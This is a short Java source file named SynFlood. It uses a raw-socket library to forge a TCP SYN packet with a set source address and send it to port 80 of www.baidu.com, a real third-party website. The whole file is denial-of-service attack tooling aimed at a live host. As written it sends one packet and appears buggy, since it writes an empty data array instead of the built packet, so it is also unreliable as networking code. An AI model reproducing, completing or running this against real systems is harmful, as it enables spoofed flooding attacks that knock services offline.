package example;

import static com.savarese.rocksaw.net.RawSocket.getProtocolByName;

import java.io.IOException;
import java.net.InetAddress;

import org.savarese.vserv.tcpip.TCPPacket;

import com.savarese.rocksaw.net.RawSocket;

public class SynFlood {

	static int addressAsWord(InetAddress address) {
		int result = 0;
		for (byte b : address.getAddress()) {
			result = result << 8 | (b & 0xFF);
		}
		return result;
	}

	public static void main(String[] args) throws IOException {
		// TODO Auto-generated method stub
		RawSocket socket = new RawSocket();
		socket.open(RawSocket.PF_INET, getProtocolByName("tcp"));
		socket.setIPHeaderInclude(true);
		// IPPacket ip = new IPPacket(40);
		InetAddress address = InetAddress.getByName("10.0.2.15");
		// ip.setSourceAsWord(addressAsWord(address));
		TCPPacket tcp = new TCPPacket(1);
		byte[] data = new byte[100];
		tcp.setData(data);
		tcp.setIPVersion(4);
		tcp.setSourceAsWord(addressAsWord(address));
		address = InetAddress.getByName("www.baidu.com");
		tcp.setDestinationAsWord(addressAsWord(address));
		tcp.setTTL(64);
		tcp.setIPHeaderLength(5);
		tcp.setIPPacketLength(40);
		tcp.setProtocol(TCPPacket.PROTOCOL_TCP);
		// System.out.println(tcp.getIPChecksum());
		tcp.computeIPChecksum();
		// System.out.println(tcp.getIPChecksum());

		tcp.setSourcePort(60000);
		tcp.setDestinationPort(80);
		// tcp.setAckNumber(0);
		// tcp.setSequenceNumber(0);
		tcp.setControlFlags(TCPPacket.MASK_SYN);
		tcp.setTCPHeaderLength(5);
		tcp.computeTCPChecksum();
		int length = tcp.getIPPacketLength();
		// System.out.println(length);
		socket.write(address, data, 0, length);
		// tcp.set
	}

}
